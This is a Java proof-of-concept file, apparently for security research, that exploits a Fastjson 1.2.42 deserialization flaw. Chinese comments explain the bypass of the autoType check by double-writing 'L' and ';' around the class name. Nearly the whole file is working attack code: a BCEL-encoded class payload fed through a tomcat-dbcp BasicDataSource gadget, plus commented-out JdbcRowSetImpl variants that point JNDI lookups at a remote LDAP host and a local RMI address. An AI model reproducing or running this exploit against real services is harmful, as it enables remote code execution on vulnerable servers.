import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer;

/**
 * Created by xjj on 2023/3/8.
 */
public class FastJson3_Eq1242 {
    static {
        System.setProperty("com.alibaba.fastjson.parser.ParserConfig.autoTypeSupport", "true");
    }
    public static String jdbcRowSetImpl() {
        /**
         * 和上一个逻辑一样
         * 只不过多了一层过滤判断首尾字符串, 并截掉
         * 只需要双写即可
         * checkAutoType() 的时候递归首尾去掉加载恶意代码
         */
        // poc 这块首尾加了L和;
//        String poc = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\", \"dataSourceName\":\"ldap://47.95.7.37:1389/Calc\", \"autoCommit\":true}";

        // 高版本测试
//        String poc = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\", \"dataSourceName\":\"rmi://127.0.0.1:1099/Calc\", \"autoCommit\":true}";

        // bcel + tomcat-dbcp
        String bcel = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5RMo$d3$40$Q$7d$9b8$b1cl$d2$a6$q$7cC$a0$F$d2J$d4$Xn$ad$wDU$q$84$a1$88T$e5$bc$de$ae$da$N$h$afeo$aa$f0$8b8$f7R$Q$H$7e$A$3f$K1$5e$daR$Jnx$e5$Z$cf$9byofG$fe$f1$f3$dbw$A$cf$f08D$80$eb$nn$e0f$80$5b$b5$bf$ed$e3N$88$W$ee$fa$b8$e7$e3$3eC$7bS$e5$can14G$ab$fb$M$de$b69$90$M$ddT$e5$f2$edl$9a$c9r$8fg$9a$90$5ej$E$d7$fb$bcTu$7c$Gz$f6HU$M$cfSa$a6$c9$7c2$d1$92$97$b9$ca$P$93$p$$$3e$s$T$7e$cc$93$8cWJ$qB$f3$aa$d2$86$l$c82$c9$3eY$v$a8K$95$ec$i$x$fdBH$bd$c1$Ql$K$7d6$I$p$e1$7e$ea$c8$ca$q$afvw$e6B$WV$99$9c$ca$e2$b1$r$e57$bcp$D$d0$5d$Y$c2$b1$99$95B$beT$f5$40$f1$b9$e4z$cd$8f$d0A$e8c$Y$e1$B$k2$ML$n$f3$e1S$3e$dc$e6Z$cc4$b7$a6$5c$e7E$Ra$Z$x$MK$ff$e8$Y$e1$RB$86$ad$ff$bb$k$c3$82$ab$d5$9c$a8$bb$d9D$K$cb$b0$f8$Hz$3f$cb$ad$9a$d2$f4$e1$a1$b4$XA$7f$b4$9a$feUC$x$f0$e4$5c$K$86$t$a3K$d9$b1$zi$ac$8d$cb$84w$a5$R$b2$aa$88$d0$z$ui$dd$e2$f6J$$$q$z$c3$a7$df$a2$7e$g$60$f5$8a$c8$5e$a1$u$n$cf$c8$b7$d6$be$80$9d$b8tD$b6$ed$c0$A1$d9$e8w$B$ae$a2$eb$b0$85$L2wb$40$ef$x$g$bd$e6$v$bc$P$9f$R$bc$5e$3bE$fb$c4$e1$j$e2$b6$d0t$8a$D$fa$C$b1$3a$a4$T$d1$89$e9$y$92$e2y$87$Y$k$c5$3d$8a$96$e8$f5$d1H$7d$5c$f3$u$d1wC$N$7e$B$b8$b1$V$bc$e0$C$A$A";
        String poc = "{\n" +
                "    {\n" +
                "        \"aaa\": {\n" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\": \"" + bcel + "\"\n" +
                "        }\n" +
                "    }: \"bbb\"\n" +
                "}";

        /**
         * 下面三种任选一种
         * JSON.parse(PoC);
         * JSON.parseObject(PoC);
         * JSONObject.parse(PoC);
         */
        return poc;
    }

    public static void main(String[] args) {
        System.out.println(JSON.VERSION);

        String poc = jdbcRowSetImpl();
        JSON.parseObject(poc);
    }
}
